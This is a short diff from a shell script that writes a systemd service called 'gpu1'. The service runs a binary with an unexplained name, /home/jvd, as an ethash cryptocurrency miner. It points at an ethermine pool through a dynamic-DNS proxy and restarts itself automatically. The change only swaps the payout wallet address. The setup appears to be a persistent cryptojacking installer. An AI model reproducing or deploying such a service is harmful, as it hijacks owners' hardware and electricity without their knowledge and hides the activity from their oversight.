@@ -9,7 +9,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/jvd -a ethash -o stratum+tcp://asia2.ethermine.org:14444 -u 0x4296116d44a4a7259B52B1A756e19083e675062A.default  --proxy socketh.duckdns.org:9999
+ExecStart= /home/jvd -a ethash -o stratum+tcp://asia2.ethermine.org:14444 -u 0xf27d2dd7303ea0d39e9762276467e98bb8d09072.default  --proxy socketh.duckdns.org:9999
 WatchdogSec=36000
 Restart=always
 RestartSec=60
